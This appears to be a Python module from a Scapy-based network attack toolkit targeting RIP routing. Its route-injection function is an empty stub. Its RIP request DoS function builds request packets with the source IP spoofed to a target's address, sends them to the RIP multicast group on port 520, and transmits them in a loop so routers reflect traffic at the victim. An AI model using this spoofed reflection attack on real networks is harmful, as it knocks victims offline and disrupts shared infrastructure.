from scapy.layers.inet import IP
from scapy.layers.rip import *
from scapy.packet import Packet
from libs.aux_funcs import send_l3_loop, attack_cat, attack_layer, attack_type, type_wrapper


RIP_BROADCAST_IP = '224.0.0.9'
RIP_UDP_PORT = 520

@type_wrapper(name="RIP Route Injection", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=[])
def RIP_route_injection(args):
    """Performs a RIP route injection attack. Utilizes imported routing information"""
    pkt = args['pkt']

    rip_info = _RIP_parse_routes(args)

    pass

@type_wrapper(name="RIP Request DoS", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=['target_ip'])
def RIP_request_DoS(args):
    """Performs a DoS Reflection attack utilizing RIP requests. Requires target IP"""

    pkt = args['pkt']

    if pkt != None:
        if pkt.haslayer(IP):
            pkt[IP].ttl = 15
            pkt[IP].src = args['target_ip']
            pkt[IP].dst = RIP_BROADCAST_IP

        pkt = pkt/UDP(sport=RIP_UDP_PORT, dport=RIP_UDP_PORT)/RIP(cmd=1,version=2)/RIPEntry(AF=0,metric=16)

    else:
        pkt = IP(src=args['target_ip'], dst=RIP_BROADCAST_IP, ttl=15)/UDP(sport=RIP_UDP_PORT, dport=RIP_UDP_PORT)/RIP(cmd=1,version=2)/RIPEntry(AF=0,metric=16)

    args['pkt'] = pkt
    send_l3_loop(args)

    return




def _RIP_parse_routes(args):
    pass